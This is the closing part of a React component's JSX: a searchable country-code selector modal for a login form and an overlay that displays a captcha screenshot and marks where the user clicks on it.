                              <path d="M19.9376 10.7051C21.1956 10.7052 22.2187 11.7285 22.2189 12.9902C22.2192 13.5958 21.9787 14.177 21.5509 14.6055C21.1231 15.0338 20.543 15.2747 19.9376 15.2754C19.3324 15.2745 18.7519 15.0338 18.3243 14.6055C17.8967 14.177 17.657 13.5956 17.6573 12.9902C17.6569 12.385 17.8969 11.8045 18.3243 11.376C18.7519 10.9474 19.3322 10.7061 19.9376 10.7051Z"></path>
                              <path clipRule="evenodd" d="M15.9923 4C22.62 4 27.9933 9.37324 27.9933 16.001C27.9931 22.6286 22.6199 28.001 15.9923 28.001C10.5837 28.0008 6.01135 24.4196 4.5128 19.501L4.49522 19.4941C3.87969 17.6827 4.01879 15.2581 4.02159 15.2109C4.02015 15.2085 4.01912 15.2055 4.01768 15.2031C4.42881 8.94762 9.63291 4.00016 15.9923 4ZM15.9923 5.59961C10.6409 5.59977 6.23205 9.64352 5.65538 14.8408C5.86797 15.2271 6.0635 15.6431 6.20323 16.1084L10.4718 17.8682C10.648 17.7489 10.8362 17.6485 11.0333 17.5684C11.4862 17.382 11.9632 17.2976 12.4386 17.3193L15.3751 13.0537L15.3741 12.9951H15.3702C15.3702 10.4772 17.4154 8.42969 19.9288 8.42969C22.4471 8.43496 24.4874 10.4772 24.4874 12.9951C24.4872 15.5128 22.4432 17.5625 19.9288 17.5625L19.8253 17.5605L15.628 20.5625C15.6402 21.0325 15.5524 21.4998 15.3712 21.9336C15.0315 22.748 14.3824 23.3942 13.5665 23.7305C12.7508 24.0666 11.8354 24.065 11.0206 23.7266C9.98487 23.2953 9.27888 22.399 9.05382 21.376L6.53917 20.3379C8.18419 23.9164 11.8 26.4012 15.9923 26.4014C21.7363 26.4014 26.3935 21.7449 26.3937 16.001C26.3937 10.2569 21.7364 5.59961 15.9923 5.59961ZM13.2833 18.2764C12.6542 18.0152 11.9814 18.0231 11.3898 18.248L12.9278 18.8828C13.3909 19.0763 13.7584 19.446 13.9493 19.9102C14.1402 20.3742 14.1383 20.8951 13.9454 21.3584C13.8502 21.5876 13.711 21.7963 13.5353 21.9717C13.3595 22.147 13.1505 22.2862 12.921 22.3809C12.6915 22.4755 12.4456 22.5238 12.1974 22.5234C11.9491 22.523 11.703 22.4743 11.4737 22.3789L9.99034 21.7637C10.2613 22.3317 10.7314 22.7806 11.3116 23.0244C12.5375 23.5351 13.9364 23.0242 14.5558 21.877L14.6661 21.6387C14.9292 21.0066 14.9309 20.3066 14.67 19.6719C14.409 19.037 13.9208 18.54 13.2833 18.2764ZM19.9327 9.9541C19.1272 9.95633 18.3554 10.2776 17.7862 10.8477C17.2172 11.4177 16.8966 12.1897 16.8956 12.9951C16.8963 13.8009 17.217 14.5743 17.7862 15.1445C18.3554 15.7145 19.1272 16.0359 19.9327 16.0381C20.7385 16.0361 21.5108 15.7147 22.0802 15.1445C22.6496 14.5742 22.9701 13.801 22.9708 12.9951C22.9698 12.1895 22.6495 11.4167 22.0802 10.8467C21.5108 10.2766 20.7384 9.95609 19.9327 9.9541Z" fillRule="evenodd"></path>
                            </svg>
                          </div>
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="pop-overlayer" style={{ backgroundColor: "rgba(16, 18, 18, 0)" }}>
        <div className="absolute left-0 h-full z-10 pointer-events-none" style={{ width: "27px" }}></div>
      </div>

      {/* Country Selector Modal - Centered Modal Style (Strict Image #2 Match) */}
      {
        showCountrySelector && (
          <div
            className="fixed inset-0 flex justify-center"
            style={{
              zIndex: 9999,
              backgroundColor: 'rgba(0, 0, 0, 0.55)',
              // backdropFilter removed
              alignItems: 'flex-start',
              paddingTop: '120px' // Keep top offset
            }}
            onClick={(e) => {
              if (e.target === e.currentTarget) {
                setShowCountrySelector(false);
              }
            }}
          >
            <div
              onClick={(e) => e.stopPropagation()}
              style={{
                width: 'min(560px, 100vw)',
                height: '100%', // Fill remaining height to touch bottom
                backgroundColor: '#2f3434',
                border: '1px solid rgba(255, 255, 255, 0.06)',
                borderBottom: 'none', // No bottom border
                borderRadius: '12px 12px 0 0', // Round top only
                boxShadow: '0 12px 28px rgba(0, 0, 0, 0.35)',
                overflow: 'hidden',
                display: 'flex',
                flexDirection: 'column'
              }}
            >
              {/* Header */}
              <div
                style={{
                  position: 'relative',
                  padding: '16px 48px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  borderBottom: '1px solid rgba(255, 255, 255, 0.06)' // Subtle divider
                }}
              >
                <h3 style={{
                  fontSize: '18px',
                  fontWeight: 600,
                  color: '#fff',
                  margin: 0
                }}>Area Select</h3>
                <button
                  onClick={() => setShowCountrySelector(false)}
                  style={{
                    position: 'absolute',
                    right: '12px',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    width: '34px', // 34x34
                    height: '34px',
                    borderRadius: '8px',
                    backgroundColor: 'rgba(255, 255, 255, 0.08)',
                    border: '1px solid rgba(255, 255, 255, 0.06)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    cursor: 'pointer',
                    padding: 0
                  }}
                  aria-label="Close"
                >
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M18 6L6 18M6 6l12 12" />
                  </svg>
                </button>
              </div>

              {/* Search */}
              <div style={{ padding: '12px 16px 12px 16px' }}>
                <div style={{ position: 'relative' }}>
                  <div style={{
                    position: 'absolute',
                    left: '12px',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    pointerEvents: 'none'
                  }}>
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.35)" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <circle cx="11" cy="11" r="8" />
                      <path d="M21 21l-4.35-4.35" />
                    </svg>
                  </div>
                  <input
                    type="text"
                    style={{
                      width: '100%',
                      height: '46px',
                      backgroundColor: 'rgba(255, 255, 255, 0.04)', // Lighter/Flat background
                      border: isSearchFocused ? '1px solid #2fe06f' : '1px solid rgba(255, 255, 255, 0.08)', // Green on focus
                      borderRadius: '8px',
                      paddingLeft: '40px', // Adjusted for icon
                      paddingRight: '16px',
                      color: '#fff',
                      fontSize: '15px',
                      outline: 'none',
                      transition: 'border-color 0.2s'
                    }}
                    placeholder="" // No placeholder text
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    onFocus={() => setIsSearchFocused(true)}
                    onBlur={() => setIsSearchFocused(false)}
                  />
                </div>
              </div>

              {/* List */}
              <div
                style={{
                  flex: 1,
                  overflowY: 'auto',
                  padding: '0 14px 14px' // Added padding from screenshot
                }}
                className="custom-scrollbar"
              >
                <style jsx>{`
                .custom-scrollbar::-webkit-scrollbar {
                  width: 4px;
                }
                .custom-scrollbar::-webkit-scrollbar-track {
                  background: transparent;
                }
                .custom-scrollbar::-webkit-scrollbar-thumb {
                  background: rgba(255, 255, 255, 0.18);
                  border-radius: 4px;
                }
              `}</style>
                {COUNTRIES.filter(c =>
                  c.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
                  c.code.includes(searchQuery) ||
                  (c.localName && c.localName.toLowerCase().includes(searchQuery.toLowerCase()))
                )
                  // Removed sorting: Selected item stays in place
                  .map((country, index, arr) => {
                    const isSelected = selectedCountryCode === country.code;
                    return (
                      <div
                        key={country.code + country.name}
                        onClick={() => {
                          if (countrySelectorTarget === 'login') {
                            setLoginCountryCode(country.code);
                            setLoginAutoCountryApplied(false);
                          } else {
                            setCountryCode(country.code);
                            setAutoCountryApplied(false);
                          }
                          setCountrySelectorTarget(null);
                          setShowCountrySelector(false);
                          setSearchQuery('');
                        }}
                        style={{
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'space-between',
                          padding: '14px 16px',
                          cursor: 'pointer',
                          borderBottom: '1px solid rgba(255, 255, 255, 0.04)', // Very subtle separator
                          backgroundColor: isSelected ? 'rgba(255, 255, 255, 0.10)' : 'transparent', // Full width highlight
                          transition: 'background-color 0.15s'
                        }}
                        onMouseEnter={(e) => {
                          if (!isSelected) e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.04)';
                        }}
                        onMouseLeave={(e) => {
                          if (!isSelected) e.currentTarget.style.backgroundColor = 'transparent';
                        }}
                      >
                        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', flex: 1, minWidth: 0 }}>
                          <span style={{
                            width: '64px',
                            flexShrink: 0,
                            color: 'rgba(255, 255, 255, 0.75)',
                            fontWeight: 500,
                            fontSize: '14px'
                          }}>
                            {country.code}
                          </span>
                          <span style={{
                            color: '#fff',
                            fontWeight: 600,
                            fontSize: '14px',
                            overflow: 'hidden',
                            textOverflow: 'ellipsis',
                            whiteSpace: 'nowrap'
                          }}>
                            {country.name}
                            {country.localName && (
                              <span style={{ color: 'rgba(255, 255, 255, 0.45)', fontWeight: 400 }}> ({country.localName})</span>
                            )}
                          </span>
                        </div>
                        <div
                          style={{
                            width: '22px',
                            height: '22px',
                            borderRadius: '50%',
                            border: isSelected
                              ? '5px solid #2fe06f' // Thick green ring
                              : '2px solid rgba(255, 255, 255, 0.3)',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            flexShrink: 0,
                            background: 'transparent',
                            transition: 'border 0.2s'
                          }}
                        >
                          {/* Inner dot removed for thick ring style */}
                        </div>
                      </div>
                    );
                  })}
              </div>
            </div>
          </div>
        )
      }

      {/* Captcha Overlay - Semi-transparent to show page behind */}
      {showCaptchaOverlay && captchaScreenshot && (
        <div
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            width: '100vw',
            height: '100vh',
            backgroundColor: 'rgba(26, 29, 31, 0.85)',
            backdropFilter: 'blur(4px)',
            zIndex: 9999,
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '20px'
          }}
        >
          {/* Captcha screenshot */}
          <div
            onMouseDown={handleCaptchaMouseDown}
            onMouseMove={handleCaptchaMouseMove}
            onMouseUp={handleCaptchaMouseUp}
            onMouseLeave={handleCaptchaMouseLeave}
            onTouchStart={handleCaptchaTouchStart}
            onTouchMove={handleCaptchaTouchMove}
            onTouchEnd={handleCaptchaTouchEnd}
            style={{
              cursor: 'pointer',
              position: 'relative',
              maxWidth: '100%',
              maxHeight: '80vh',
              userSelect: 'none',
              touchAction: 'none' // Prevent browser gestures
            }}
          >
            <img
              ref={captchaImageRef}
              src={captchaScreenshot}
              alt="Security Verification"
              draggable={false}
              style={{
                maxWidth: '100%',
                maxHeight: '80vh',
                objectFit: 'contain',
                borderRadius: '12px',
                boxShadow: '0 8px 32px rgba(0,0,0,0.5)'
              }}
            />

            {/* Click indicator */}
            {lastCaptchaClick && (
              <div
                style={{
                  position: 'absolute',
                  left: `${(lastCaptchaClick.x / (captchaImageRef.current?.naturalWidth || 1)) * 100}%`,
                  top: `${(lastCaptchaClick.y / (captchaImageRef.current?.naturalHeight || 1)) * 100}%`,
                  transform: 'translate(-50%, -50%)',
                  width: '24px',
                  height: '24px',
                  borderRadius: '50%',
                  border: '2px solid #24EE89',
                  backgroundColor: 'rgba(36, 238, 137, 0.3)',
                  animation: 'ping 0.5s ease-out'
                }}
              />
            )}
          </div>
        </div>
      )}

    </>
  );
}
